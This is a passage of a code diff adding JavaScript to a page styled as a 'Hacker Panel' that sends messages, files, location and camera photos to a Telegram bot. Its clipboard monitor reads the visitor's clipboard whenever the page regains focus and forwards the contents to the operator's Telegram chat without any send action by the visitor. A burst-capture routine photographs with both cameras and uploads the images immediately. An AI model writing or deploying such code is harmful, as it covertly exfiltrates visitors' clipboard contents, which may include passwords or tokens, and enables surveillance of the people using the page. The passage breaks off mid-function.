+    document.getElementById('scanStatus').innerHTML =
+        `<span class="log-time">[${getFormattedTime()}]</span> ${randomStatus}`;
+}
+
+// ===== 9. FILE BUFFER (select / drop / paste, preview, remove) =====
+function revokeUrl(item) {
+    if (item.url) {
+        URL.revokeObjectURL(item.url);
+        item.url = null;
+    }
+}
+
+function addFiles(files) {
+    if (!files.length) return;
+
+    if (isSending) {
+        showPopup("BUSY: TRANSMISSION_IN_PROGRESS", true);
+        return;
+    }
+
+    let added = 0, tooBig = 0, bufferFull = 0;
+
+    for (const file of files) {
+        if (file.size === 0) continue;   // Telegram rejects empty files
+
+        const duplicate = selectedFiles.some(f =>
+            f.file.name === file.name &&
+            f.file.size === file.size &&
+            f.file.lastModified === file.lastModified);
+        if (duplicate) continue;
+
+        if (selectedFiles.length >= MAX_FILES) { bufferFull++; continue; }
+        if (file.size > MAX_FILE_BYTES) { tooBig++; continue; }
+
+        selectedFiles.push({ id: nextFileId++, file, url: null });
+        added++;
+    }
+
+    renderPreview();
+
+    if (tooBig || bufferFull) {
+        const parts = [];
+        if (tooBig) parts.push(`${tooBig} FILE(S) OVER ${formatSize(MAX_FILE_BYTES)}`);
+        if (bufferFull) parts.push(`MAX ${MAX_FILES} FILES`);
+        showPopup(`SKIPPED: ${parts.join(' / ')}`, true);
+        playSound(300, 0.1, 'sawtooth');
+    } else if (added) {
+        playSound(400, 0.05, 'square');
+        showPopup(`MEDIA_BUFFER_LOADED: ${added} FILE(S)`, false);
+    }
+}
+
+function removeFile(id) {
+    if (isSending) {
+        showPopup("BUSY: TRANSMISSION_IN_PROGRESS", true);
+        return;
+    }
+    const index = selectedFiles.findIndex(f => f.id === id);
+    if (index === -1) return;
+    revokeUrl(selectedFiles[index]);
+    selectedFiles.splice(index, 1);
+    renderPreview();
+    playSound(300, 0.05, 'square');
+}
+
+function renderPreview() {
+    const container = document.getElementById('previewContainer');
+    container.innerHTML = "";
+    selectedFiles.forEach(item => container.appendChild(buildPreviewItem(item)));
+    document.getElementById('mediaCount').textContent = `${selectedFiles.length}/${MAX_FILES}`;
+    // Hint the user that text will become a caption when files are loaded
+    const ta = document.getElementById('hackerTyper');
+    if (ta) ta.placeholder = selectedFiles.length
+        ? 'ADD_CAPTION (optional — will be attached to your media)...'
+        : 'ENTER ENCRYPTED_MESSAGE...';
+}
+
+function buildPreviewItem(item) {
+    const file = item.file;
+
+    const wrap = document.createElement('div');
+    wrap.className = 'preview-item-container';
+    wrap.title = `${file.name}\n${formatSize(file.size)}`;
+
+    const thumb = document.createElement('div');
+    thumb.className = 'preview-thumb';
+
+    const showIcon = () => {
+        thumb.className = 'preview-thumb is-file';
+        thumb.replaceChildren();
+        const icon = document.createElement('i');
+        icon.className = `fas ${fileIcon(file)}`;
+        const ext = document.createElement('span');
+        ext.className = 'preview-ext';
+        ext.textContent = fileExt(file);
+        thumb.append(icon, ext);
+    };
+
+    if (file.type.startsWith('image/')) {
+        item.url = item.url || URL.createObjectURL(file);
+        const img = document.createElement('img');
+        img.className = 'preview-img';
+        img.alt = file.name;
+        img.decoding = 'async';
+        img.onerror = showIcon;   // e.g. formats the browser cannot render
+        img.src = item.url;
+        thumb.appendChild(img);
+    } else if (file.type.startsWith('video/')) {
+        item.url = item.url || URL.createObjectURL(file);
+        const video = document.createElement('video');
+        video.className = 'preview-img';
+        video.muted = true;
+        video.playsInline = true;
+        video.preload = 'metadata';
+        video.onerror = showIcon;
+        video.src = item.url + '#t=0.1';   // shows the first frame as thumbnail
+        thumb.appendChild(video);
+        const badge = document.createElement('i');
+        badge.className = 'fas fa-play preview-badge';
+        thumb.appendChild(badge);
+    } else {
+        showIcon();
+    }
+
+    const remove = document.createElement('button');
+    remove.type = 'button';
+    remove.className = 'preview-remove';
+    remove.dataset.id = String(item.id);
+    remove.setAttribute('aria-label', `Remove ${file.name}`);
+    remove.textContent = '×';
+
+    const name = document.createElement('div');
+    name.className = 'preview-name';
+    name.textContent = file.name;
+
+    const size = document.createElement('div');
+    size.className = 'preview-size';
+    size.textContent = formatSize(file.size);
+
+    wrap.append(thumb, remove, name, size);
+    return wrap;
+}
+
+// ===== 9b. VOICE RECORDING =====
+
+
+
+// ===== 9c. LOCATION =====
+async function sendLocationToTelegram() {
+    if (isSending)                { showPopup('BUSY: TRANSMISSION_IN_PROGRESS', true); return; }
+    if (!navigator.geolocation)   { showPopup('GEOLOCATION_NOT_SUPPORTED', true); return; }
+    if (!navigator.onLine)        { showPopup('OFFLINE: CHECK_CONNECTION', true); return; }
+
+    showPopup('ACQUIRING_COORDINATES...', false);
+    playSound(400, 0.1, 'sine');
+
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            showPopup(`COORDINATES_LOCKED: ${latitude.toFixed(5)}, ${longitude.toFixed(5)}`, false);
+
+            try {
+                const res = await tgCall('sendLocation', {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    latitude:  String(latitude),
+                    longitude: String(longitude)
+                }, null, null);
+
+                if (res.ok) {
+                    showPopup(`📍 LOCATION_SENT: ±${Math.round(accuracy)}m accuracy`, false);
+                    playSound(800, 0.3, 'sine');
+                } else {
+                    showPopup(`LOCATION_FAILED: ${res.description}`, true);
+                }
+            } catch (err) {
+                showPopup(`LOCATION_ERROR: ${err.message}`, true);
+            }
+        },
+        (err) => {
+            const msgs = { 1: 'GPS_PERMISSION_DENIED', 2: 'POSITION_UNAVAILABLE', 3: 'GPS_TIMEOUT' };
+            showPopup(`GPS_ERROR: ${msgs[err.code] || err.message}`, true);
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
+    );
+}
+
+// ===== 10. TELEGRAM SEND =====
+function tgUpload(method, fields, onProgress) {
+    return new Promise((resolve, reject) => {
+        const xhr = new XMLHttpRequest();
+        // Calls without fields (getMe) must be a plain GET: Telegram rejects an empty multipart POST with HTTP 400
+        const hasFields = (fields instanceof FormData) ? true : Object.keys(fields).length > 0;
+        xhr.open(hasFields ? 'POST' : 'GET', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`);
+        xhr.timeout = 15 * 60 * 1000;
+
+        if (onProgress && xhr.upload) {
+            xhr.upload.onprogress = (e) => {
+                if (e.lengthComputable) onProgress(e.loaded);
+            };
+        }
+
+        xhr.onload = () => {
+            let data = null;
+            try { data = JSON.parse(xhr.responseText); } catch (e) { /* not JSON */ }
+            resolve(data || { ok: false, error_code: xhr.status, description: `HTTP_${xhr.status}` });
+        };
+        xhr.onerror = () => reject(new Error('NETWORK_ERROR'));
+        xhr.ontimeout = () => reject(new Error('UPLOAD_TIMEOUT'));
+
+        if (!hasFields) { xhr.send(); return; }
+        // Accept a pre-built FormData (e.g. sendMediaGroup) or a plain object
+        const body = (fields instanceof FormData)
+            ? fields
+            : (() => { const f = new FormData(); Object.entries(fields).forEach(([k,v]) => f.append(k,v)); return f; })();
+        xhr.send(body);
+    });
+}
+
+// Retries on network errors and waits out Telegram rate limits (HTTP 429)
+async function tgCall(method, fields, onProgress, statusEl) {
+    let lastErr = null;
+
+    for (let attempt = 0; attempt < 3; attempt++) {
+        try {
+            const res = await tgUpload(method, fields, onProgress);
+            if (res.ok) return res;
+
+            if (res.error_code === 429) {
+                const wait = ((res.parameters && res.parameters.retry_after) || 5) + 1;
+                const original = statusEl ? statusEl.textContent : '';
+                for (let s = wait; s > 0; s--) {
+                    if (statusEl) statusEl.textContent = `RATE_LIMIT: RETRY_IN ${s}s`;
+                    await sleep(1000);
+                }
+                if (statusEl) statusEl.textContent = original;
+                continue;
+            }
+            return res;
+        } catch (err) {
+            lastErr = err;
+            if (attempt < 2) await sleep(1500 * (attempt + 1));
+        }
+    }
+
+    if (lastErr) throw lastErr;
+    return { ok: false, description: 'RATE_LIMITED' };
+}
+
+function pickMethod(file) {
+    const type = file.type || '';
+    const name = file.name.toLowerCase();
+    if (type === 'image/gif') return ['sendAnimation', 'animation'];
+    if (/^image\/(jpeg|png|webp)$/.test(type) && file.size <= MAX_PHOTO_BYTES) return ['sendPhoto', 'photo'];
+    if (type === 'video/mp4' || name.endsWith('.mp4')) return ['sendVideo', 'video'];
+    return ['sendDocument', 'document'];
+}
+
+function buildFields(method, field, file, captionText, extra = {}) {
+    const fields = { chat_id: TELEGRAM_CHAT_ID, [field]: file };
+    if (method === 'sendVideo') fields.supports_streaming = 'true';
+    if (captionText) fields.caption = captionText;
+    Object.assign(fields, extra);
+    return fields;
+}
+
+function lockUI(locked) {
+    document.querySelectorAll('.action-row button, .media-tools-row button').forEach(b => { b.disabled = locked; });
+    document.querySelectorAll('.action-row, .media-tools-row').forEach(r => r.classList.toggle('busy', locked));
+    document.querySelectorAll('label.hacker-btn').forEach(l => l.classList.toggle('disabled', locked));
+    document.getElementById('hackerTyper').readOnly = locked;
+}
+
+async function sendToTelegram() {
+    if (isSending) return;
+    const typer   = document.getElementById('hackerTyper');
+    const caption = typer.value.trim();
+    const queue   = selectedFiles.slice();
+
+    if (!caption && queue.length === 0) {
+        showPopup("EMPTY_PAYLOAD: NO_DATA_TO_TRANSMIT", true);
+        playSound(300, 0.1, 'sawtooth');
+        return;
+    }
+
+    if (!navigator.onLine) {
+        if (caption) queuePush({ kind: 'text', text: caption });
+        if (queue.length) queuePush({ kind: 'files', files: queue.map(f=>f.file), caption });
+        showPopup(`📥 QUEUED: ${offlineQueue.length} ITEM(S) — WILL_SEND_WHEN_ONLINE`, false);
+        typer.value = '';
+        selectedFiles.forEach(revokeUrl);
+        selectedFiles = [];
+        renderPreview();
+        updateCharCounter();
+        return;
+    }
+
+    isSending = true;
+    lockUI(true);
+    clearTimeout(loaderHideTimer);
+    playSound(600, 0.4, 'sawtooth');
+
+    const loaderContainer = document.getElementById('loader-container');
+    const loaderText      = document.getElementById('loader-text');
+    const pFill           = document.getElementById('p-fill');
+    const progressText    = document.getElementById('progressText');
+    loaderContainer.style.display = 'block';
+
+    // Categorise files
+    const albumItems = [];   // photo / video → sendMediaGroup
+    const soloItems  = [];   // doc / gif / etc. → individual
+
+    for (const item of queue) {
+        const [method] = pickMethod(item.file);
+        if (method === 'sendPhoto' || method === 'sendVideo') albumItems.push(item);
+        else soloItems.push(item);
+    }
+
+    const hasMedia = queue.length > 0;
+
+    // Progress: weighted by bytes
+    const fileBytes  = queue.reduce((s, q) => s + q.file.size, 0);
+    const textWeight = (caption && !hasMedia) ? Math.max(fileBytes * 0.02, 1) : 0;
+    const totalWeight = (fileBytes + textWeight) || 1;
+    let doneWeight = 0;
+
+    const setProgress = (extra = 0) => {
+        const p = Math.min(100, Math.round(((doneWeight + extra) / totalWeight) * 100));
+        pFill.style.width    = `${p}%`;
+        progressText.textContent = `${p}%`;
+    };
+    setProgress();
+
+    let captionUsed = false;
+    let textOk      = !(caption && !hasMedia);  // true when text will be handled as a caption on media
+    let sentOk = 0, lastError = '', fatal = false;
+    const sentIds = new Set();
+
+    try {
+        // ── Text only (no media) ──────────────────────────────────────────
+        if (caption && !hasMedia) {
+            loaderText.textContent = 'SENDING_MESSAGE...';
+            try {
+                const res = await tgCall('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: caption }, null, loaderText);
+                if (res.ok) {
+                    textOk = true;
+                } else {
+                    lastError = res.description || 'UNKNOWN_ERROR';
+                    if ([401, 403, 404].includes(res.error_code)) fatal = true;
+                }
+            } catch (err) { lastError = err.message; fatal = true; }
+            doneWeight += textWeight;
+            setProgress();
+        }
+
+        // ── Album items (sendMediaGroup or single) ────────────────────────
+        if (albumItems.length > 0 && !fatal) {
+            if (albumItems.length >= 2) {
+                loaderText.textContent = `SENDING_ALBUM: ${albumItems.length}_ITEMS...`;
+                const form = new FormData();
+                form.append('chat_id', TELEGRAM_CHAT_ID);
+                const mediaJson = albumItems.map((item, i) => {
+                    const fname = `media${i}`;
+                    form.append(fname, item.file, item.file.name);
+                    const [method] = pickMethod(item.file);
+                    const type = method === 'sendPhoto' ? 'photo' : 'video';
+                    const entry = { type, media: `attach://${fname}` };
+                    if (type === 'video') entry.supports_streaming = true;
+                    if (i === 0 && caption && !captionUsed) { entry.caption = caption; captionUsed = true; }
+                    return entry;
+                });
+                form.append('media', JSON.stringify(mediaJson));
+                const albumBytes = albumItems.reduce((s, i) => s + i.file.size, 0);
+                const onProg = (loaded) => setProgress(Math.min(loaded, albumBytes));
+
+                let res = await tgCall('sendMediaGroup', form, onProg, loaderText);
+
+                if (res.ok) {
+                    sentOk += albumItems.length;
+                    albumItems.forEach(i => sentIds.add(i.id));
+                } else if (res.error_code === 400) {
+                    // Fallback: individual sends
+                    captionUsed = false;
+                    for (const item of albumItems) {
+                        const [method, field] = pickMethod(item.file);
+                        const capText = (caption && !captionUsed) ? caption : null;
+                        let r = await tgCall(method, buildFields(method, field, item.file, capText), null, loaderText);
+                        if (!r.ok && r.error_code === 400) {
+                            r = await tgCall('sendDocument', buildFields('sendDocument', 'document', item.file, capText && !captionUsed ? capText : null), null, loaderText);
+                        }
+                        if (r.ok) { sentOk++; sentIds.add(item.id); if (capText) captionUsed = true; }
+                        else { lastError = r.description || 'UNKNOWN'; }
+                        await sleep(300);
+                    }
+                } else {
+                    lastError = res.description || 'UNKNOWN';
+                    if ([401, 403, 404].includes(res.error_code)) fatal = true;
+                }
+                doneWeight += albumBytes;
+                setProgress();
+            } else {
+                // Single photo / video
+                const item = albumItems[0];
+                const [method, field] = pickMethod(item.file);
+                loaderText.textContent = `UPLOADING: ${shortName(item.file.name)}`;
+                const capText = (caption && !captionUsed) ? caption : null;
+                const onProg  = (loaded) => setProgress(Math.min(loaded, item.file.size));
+                let res = await tgCall(method, buildFields(method, field, item.file, capText), onProg, loaderText);
+                if (!res.ok && res.error_code === 400 && method !== 'sendDocument') {
+                    res = await tgCall('sendDocument', buildFields('sendDocument', 'document', item.file, capText && !captionUsed ? capText : null), onProg, loaderText);
+                }
+                if (res.ok) {
+                    sentOk++;
+                    sentIds.add(item.id);
+                    if (capText) captionUsed = true;
+                } else {
+                    lastError = res.description || 'UNKNOWN';
+                    if ([401, 403, 404].includes(res.error_code)) fatal = true;
+                }
+                doneWeight += item.file.size;
+                setProgress();
+            }
+            if (captionUsed) textOk = true;
+        }
+
+        // ── Solo items (docs, gif, etc.) ───────────────────────────────────
+        for (let i = 0; i < soloItems.length && !fatal; i++) {
+            const item = soloItems[i];
+            const [method, field] = pickMethod(item.file);
+            loaderText.textContent = `UPLOADING ${i + 1}/${soloItems.length}: ${shortName(item.file.name)}`;
+            const canCaption = !captionUsed && caption;
+            const capText    = canCaption ? caption : null;
+            const onProg     = (loaded) => setProgress(Math.min(loaded, item.file.size));
+
+            let res = await tgCall(method, buildFields(method, field, item.file, capText), onProg, loaderText);
+
+            // Fallback: if media rejected, resend as generic document
+            if (!res.ok && res.error_code === 400) {
+                loaderText.textContent = 'RETRYING_AS_DOCUMENT...';
+                res = await tgCall('sendDocument', buildFields('sendDocument', 'document', item.file, null), onProg, loaderText);
+            }
+
+            if (res.ok) {
+                sentOk++;
+                sentIds.add(item.id);
+                if (capText) { captionUsed = true; textOk = true; }
+            } else {
+                lastError = res.description || 'UNKNOWN';
+                if ([401, 403, 404].includes(res.error_code)) fatal = true;
+            }
+            doneWeight += item.file.size;
+            setProgress();
+            if (i < soloItems.length - 1 && !fatal) await sleep(400);
+        }
+
+        // ── If caption wasn't used as caption but media was sent, send as message ──
+        if (caption && hasMedia && !captionUsed && !fatal) {
+            loaderText.textContent = 'SENDING_MESSAGE...';
+            try {
+                const res = await tgCall('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: caption }, null, loaderText);
+                if (res.ok) textOk = true;
+                else lastError = res.description || 'UNKNOWN';
+            } catch (err) { lastError = err.message; }
+        }
+
+        // ── Clean up delivered items; keep failed ones for retry ──────────
+        selectedFiles = selectedFiles.filter(f => {
+            if (sentIds.has(f.id)) { revokeUrl(f); return false; }
+            return true;
+        });
+        renderPreview();
+
+        if (caption && textOk) { typer.value = ''; updateCharCounter(); }
+
+        const failedCount = queue.length - sentOk + (caption && !hasMedia && !textOk ? 1 : 0);
+
+        if (failedCount === 0) {
+            loaderText.textContent = 'TRANSMISSION_COMPLETE';
+            playSound(800, 0.3, 'sine');
+            showPopup('TRANSMISSION_COMPLETE', false);
+        } else {
+            loaderText.textContent = 'TRANSMISSION_INCOMPLETE';
+            playSound(200, 0.5, 'sawtooth');
+            showPopup(`${failedCount} FAILED: ${lastError || 'UNKNOWN'} // PRESS_SEND_TO_RETRY`, true);
+        }
+
+    } catch (error) {
+        const isOffline = !navigator.onLine ||
+            error.message === 'NETWORK_ERROR' ||
+            error.message === 'UPLOAD_TIMEOUT';
+        if (isOffline) {
+            // Queue text and files so nothing is lost
+            const caption = document.getElementById('hackerTyper').value.trim();
+            if (caption) queuePush({ kind: 'text', text: caption });
+            if (selectedFiles.length) queuePush({ kind: 'files', files: selectedFiles.map(f=>f.file), caption });
+            showPopup(`📥 QUEUED: ${offlineQueue.length} ITEM(S) — WILL_SEND_WHEN_ONLINE`, false);
+            document.getElementById('hackerTyper').value = '';
+            selectedFiles.forEach(revokeUrl);
+            selectedFiles = [];
+            renderPreview();
+            updateCharCounter();
+        } else {
+            console.error('Send error:', error.message);
+            showPopup(`TRANSMISSION_FAILED: ${error.message}`, true);
+            playSound(200, 0.5, 'sawtooth');
+        }
+    } finally {
+        isSending = false;
+        lockUI(false);
+        loaderHideTimer = setTimeout(() => {
+            loaderContainer.style.display = 'none';
+            pFill.style.width            = '0%';
+            progressText.textContent     = '0%';
+            loaderText.textContent       = 'INITIALIZING TRANSMISSION...';
+        }, 2500);
+    }
+}
+
+// ===== 11. TEST TELEGRAM CONNECTION =====
+// Uses the exact same call as the real SEND (sendMessage), so if TEST works, SEND works.
+async function testTelegramConnection() {
+    if (isSending) {
+        showPopup("BUSY: TRANSMISSION_IN_PROGRESS", true);
+        return;
+    }
+    if (!navigator.onLine) {
+        showPopup("OFFLINE: CHECK_CONNECTION", true);
+        return;
+    }
+
+    showPopup("TESTING_CONNECTION...", false);
+
+    try {
+        const res = await tgCall('sendMessage', {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: "✅ Connection Test Successful!\nHacker Panel is working!"
+        }, null, null);
+
+        if (res.ok) {
+            showPopup("✅ TEST_SUCCESS: Check Telegram!", false);
+            playSound(800, 0.3, 'sine');
+        } else {
+            console.error('Test failed:', res);
+            showPopup(`❌ TEST_FAILED: ${res.error_code || ''} ${res.description || 'UNKNOWN'}`, true);
+        }
+    } catch (error) {
+        console.error('Test error:', error);
+        showPopup(`❌ NETWORK_ERROR: ${error.message}`, true);
+    }
+}
+
+
+// ===== BURST CAMERA CAPTURE (3 front + 3 back, 2-second intervals) =====
+async function cameraCapture() {
+    if (isSending || isCameraCapturing) {
+        showPopup('BUSY: CANNOT_CAPTURE_NOW', true);
+        return;
+    }
+
+    const btn     = document.getElementById('cameraBtn');
+    const btnText = document.getElementById('cameraBtnText');
+
+    isCameraCapturing = true;
+    btn.disabled = true;
+
+    const capturedFiles = [];
+
+    async function openStream(facingMode) {
+        // Try exact facingMode first; fall back to any camera if unavailable
+        try {
+            return await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: { ideal: facingMode }, width: { ideal: 1920 }, height: { ideal: 1080 } },
+                audio: false
+            });
+        } catch (_) {
+            return navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        }
+    }
+
+    async function shootThree(facingMode, label) {
+        const stream = await openStream(facingMode);
+        const video  = document.createElement('video');
+        video.srcObject = stream;
+        video.playsInline = true;
+        video.muted = true;
+        await video.play();
+
+        // Let the camera auto-expose / auto-focus before the first shot
+        await sleep(1200);
+
+        const canvas = document.createElement('canvas');
+        const ctx    = canvas.getContext('2d');
+
+        for (let i = 1; i <= 3; i++) {
+            btnText.textContent = `${label} ${i}/3`;
+            showPopup(`📸 ${label}: SHOT ${i}/3`, false);
+            playSound(900 + i * 100, 0.05, 'sine');
+
+            canvas.width  = video.videoWidth  || 1280;
+            canvas.height = video.videoHeight || 720;
+            ctx.drawImage(video, 0, 0);
+
+            const blob = await new Promise(resolve =>
+                canvas.toBlob(resolve, 'image/jpeg', 0.92));
+
+            if (blob && blob.size > 0) {
+                capturedFiles.push(
+                    new File([blob], `cam_${facingMode}_${Date.now()}_${i}.jpg`,
+                             { type: 'image/jpeg' }));
+            }
+
+            if (i < 3) await sleep(2000);   // 2 s between shots
+        }
+
+        stream.getTracks().forEach(t => t.stop());
+        video.srcObject = null;
+    }
+
+    try {
+        // ── Front camera ──
+        await shootThree('user', 'FRONT');
+
+        // ── Brief pause while switching ──
+        btnText.textContent = 'SWITCHING...';
+        await sleep(600);
+
+        // ── Back camera ──
+        await shootThree('environment', 'BACK');
+
+        // Release camera lock before handing off to send
+        isCameraCapturing = false;
+        btn.disabled = false;
+        btnText.textContent = 'CAMERA';
+
+        // Add photos to buffer then send immediately
+        addFiles(capturedFiles);
+        const n = capturedFiles.length;
+        showPopup(`📸 CAPTURED: ${n}/6 — SENDING...`, false);
+        playSound(800, 0.4, 'sine');
+        sendToTelegram();
+
+    } catch (err) {
+        showPopup(`CAMERA_ERROR: ${err.message || 'PERMISSION_DENIED'}`, true);
+        playSound(300, 0.2, 'sawtooth');
+    } finally {
+        // Runs on error path; success path already released above
+        isCameraCapturing = false;
+        btn.disabled = false;
+        btnText.textContent = 'CAMERA';
+    }
+}
+
+// ===== 12. UTILITY FUNCTIONS =====
+let audioCtx = null;   // one shared AudioContext (browsers limit how many can exist)
+
+function getAudioContext() {
+    if (!audioCtx) {
+        const Ctx = window.AudioContext || window.webkitAudioContext;
+        if (!Ctx) return null;
+        audioCtx = new Ctx();
+    }
+    if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+    return audioCtx;
+}
+
+function playSound(freq, duration, type = 'sine') {
+    try {
+        const ctx = getAudioContext();
+        if (!ctx) return;
+
+        const oscillator = ctx.createOscillator();
+        const gainNode = ctx.createGain();
+
+        oscillator.type = type;
+        oscillator.frequency.setValueAtTime(freq, ctx.currentTime);
+
+        gainNode.gain.setValueAtTime(0.03, ctx.currentTime);
+        gainNode.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + duration);
+
+        oscillator.connect(gainNode);
+        gainNode.connect(ctx.destination);
+
+        oscillator.start();
+        oscillator.stop(ctx.currentTime + duration);
+    } catch (e) {
+        // Audio not supported: ignore
+    }
+}
+
+function showPopup(message, isError = false) {
+    const popup = document.getElementById('hacker-popup');
+    const popupMsg = document.getElementById('popup-msg');
+    const popupTime = document.getElementById('popupTime');
+
+    popupMsg.textContent = message;
+    popupTime.textContent = getFormattedTime();
+
+    if (isError) {
+        popup.style.borderColor = "#ff0000";
+        popup.querySelector('.popup-header').innerHTML = '<i class="fas fa-exclamation-circle"></i> SYSTEM_ALERT';
+    } else {
+        popup.style.borderColor = "#00ff41";
+        popup.querySelector('.popup-header').innerHTML = '<i class="fas fa-check-circle"></i> SYSTEM_REPORT';
+    }
+
+    popup.classList.add('show');
+
+    clearTimeout(popupTimer);   // a new popup must not be hidden by an older timer
+    popupTimer = setTimeout(() => {
+        popup.classList.remove('show');
+    }, isError ? 6000 : 4000);
+}
+
+function clearAll() {
+    if (isSending) {
+        showPopup("BUSY: TRANSMISSION_IN_PROGRESS", true);
+        return;
+    }
+    document.getElementById('hackerTyper').value = "";
+    selectedFiles.forEach(revokeUrl);
+    selectedFiles = [];
+    renderPreview();
+    updateCharCounter();
+    playSound(300, 0.1);
+    showPopup("SYSTEM_PURGED: ALL_BUFFERS_CLEARED", false);
+}
+
+function updateCharCounter() {
+    const textarea = document.getElementById('hackerTyper');
+    const counter = document.getElementById('charCounter');
+    const max = Number(textarea.getAttribute('maxlength')) || 2048;
+    const count = textarea.value.length;
+    counter.textContent = `CHARS: ${count}/${max}`;
+
+    if (count > max * 0.97) {
+        counter.style.color = '#ff0000';
+    } else if (count > max * 0.73) {
+        counter.style.color = '#ff9900';
+    } else {
+        counter.style.color = '#00aa00';
+    }
+}
+
+function togglePanel(panelId) {
+    const panel = document.getElementById(panelId);
+    const collapsed = panel.classList.toggle('collapsed');
+    const btn = panel.querySelector('.panel-close');
+    if (btn) btn.textContent = collapsed ? '[+]' : '[−]';
+    if (!collapsed) refreshPanel(panelId);
+}
+
+function getFormattedTime() {
+    const now = new Date();
+    return `${now.getHours().toString().padStart(2, '0')}:` +
+           `${now.getMinutes().toString().padStart(2, '0')}:` +
+           `${now.getSeconds().toString().padStart(2, '0')}`;
+}
+
+// ===== 13. KONAMI CODE SECRET =====
+function handleKonamiCode(e) {
+    konamiSequence.push(e.key);
+
+    if (konamiSequence.length > KONAMI_CODE.length) {
+        konamiSequence.shift();
+    }
+
+    if (konamiSequence.join(',') === KONAMI_CODE.join(',')) {
+        showSecretOverlay();
+        konamiSequence = [];
+        playSound(1200, 1, 'sawtooth');
+    }
+}
+
+let secretTimer = null;
+
+function showSecretOverlay() {
+    const overlay = document.getElementById('secretOverlay');
+    const secretInfo = document.getElementById('secretInfo');
+    const countdownElement = document.getElementById('countdown');
+
+    if (secretTimer) return;   // already showing
+
+    const secretData = `
+    ═══════════════════════════════════════════════════════════════
+    ⚠️  CONFIGURATION (MASKED) ⚠️
+    ═══════════════════════════════════════════════════════════════
+
+    TELEGRAM CONFIGURATION:
+    ==============================
+    TOKEN: ${maskToken(TELEGRAM_BOT_TOKEN)}
+    CHAT_ID: ${TELEGRAM_CHAT_ID}
+
+    SECURITY STATUS:
+    ================
+    TOKEN_MASKED: YES
+    TRANSMISSION: ACTIVE
+    ENCRYPTION: TLS 1.3
+
+    ═══════════════════════════════════════════════════════════════
+    WARNING: This information will disappear in 10 seconds!
+    ═══════════════════════════════════════════════════════════════
+    `;
+
+    secretInfo.textContent = secretData;
+    overlay.classList.add('active');
+
+    let countdown = 10;
+    countdownElement.textContent = countdown;
+    secretTimer = setInterval(() => {
+        countdown--;
+        countdownElement.textContent = Math.max(countdown, 0);
+
+        if (countdown < 0) {
+            clearInterval(secretTimer);
+            secretTimer = null;
+            overlay.classList.remove('active');
+        }
+    }, 1000);
+}
+
+// ===== 14. SYSTEM ANIMATIONS =====
+function startSystemAnimations() {
+    const consoleLog = document.getElementById('consoleLog');
+    const logs = [
+        "[SYSTEM] ENCRYPTED_CHANNEL: ACTIVE",
+        () => "[NETWORK] PACKETS_TRANSMITTED: " + Math.floor(Math.random() * 1000),
+        "[CRYPTO] AES-256-GCM: VERIFIED",
+        "[AUTH] TOKEN: LOADED",
+        "[MEMORY] BUFFER_ALLOCATION: STABLE",
+        "[SECURITY] TRANSMISSION: READY"
+    ];
+
+    // Append a line and trim old ones with DOM calls (no innerHTML rewrite)
+    every(() => {
+        const entry = logs[Math.floor(Math.random() * logs.length)];
+        const line = typeof entry === 'function' ? entry() : entry;
+
+        consoleLog.append(document.createElement('br'), document.createTextNode(line));
+
+        while (consoleLog.querySelectorAll('br').length > 5) {
+            while (consoleLog.firstChild && consoleLog.firstChild.nodeName !== 'BR') {
+                consoleLog.removeChild(consoleLog.firstChild);
+            }
+            if (consoleLog.firstChild) consoleLog.removeChild(consoleLog.firstChild);
+        }
+        consoleLog.scrollTop = consoleLog.scrollHeight;
+    }, 5000);
+
+    // Random status indicator changes
+    every(() => {
+        const indicator = document.getElementById('statusIndicator');
+        const statuses = [
+            {text: "● READY", color: "#00ff00"},
+            {text: "⚠ SENDING", color: "#ffff00"},
+            {text: "⚡ ACTIVE", color: "#00aaff"},
+            {text: "✓ ONLINE", color: "#00ff00"}
+        ];
+
+        const randomStatus = statuses[Math.floor(Math.random() * statuses.length)];
+        indicator.textContent = randomStatus.text;
+        indicator.style.color = randomStatus.color;
+        indicator.style.borderColor = randomStatus.color;
+    }, 3000);
+}
+
+
+
+// ===== REPLY VIEWER (auto-poll Telegram for incoming messages) =====
+let lastUpdateId = 0;
+let replyCount = 0;
+let replyPolling = null;
+
+
+// ===== CLIPBOARD AUTO-SEND =====
+let lastClipboard = '';
+
+async function clipboardCheck() {
+    try {
+        const text = (await navigator.clipboard.readText()).trim();
+        // Skip: empty, too short, same as last sent, or unchanged
+        if (!text || text.length < 2 || text === lastClipboard) return;
+        lastClipboard = text;
+
+        const preview = text.length > 40 ? text.slice(0, 40) + '…' : text;
+        showPopup(`📋 CLIPBOARD: ${preview}`, false);
+        playSound(580, 0.08, 'sine');
+
+        // Telegram message limit is 4096 chars
+        const payload = text.length > 4000
+            ? text.slice(0, 4000) + '\n…[TRUNCATED]'
+            : text;
+
+        await tgCall('sendMessage', {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: `📋 CLIPBOARD_CAPTURE:\n\n${payload}`
+        }, null, null);
+    } catch (_) {
+        // clipboard-read permission denied or not supported — silent fail
+    }
+}
+
+function initClipboardMonitor() {
+    // Fire when user switches back from another app / tab
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) clipboardCheck();
+    });
+
+    // Fire when window regains focus (desktop)
+    window.addEventListener('focus', clipboardCheck);
+
+    // Fire immediately after a copy event on this page
+    document.addEventListener('copy', () => setTimeout(clipboardCheck, 80));
+}
+
+
+// ===== SEND REPLY FROM PAGE =====
+async function sendReply() {
+    const input = document.getElementById('replyInput');
+    if (!input) return;
+    const text = input.value.trim();
+    if (!text) return;
+
+    const btn = document.querySelector('.reply-send-btn');
+    if (btn) btn.disabled = true;
+
+    if (!navigator.onLine) {
+        queuePush({ kind: 'text', text });
+        showPopup('📥 REPLY_QUEUED: WILL_SEND_WHEN_ONLINE', false);
+        input.value = '';
+        if (btn) btn.disabled = false;
+        return;
+    }
+
+    try {
+        const res = await tgCall('sendMessage', {
+            chat_id: TELEGRAM_CHAT_ID,
+            text
+        }, null, null);
+
+        if (res.ok) {
+            // Show own message in the panel
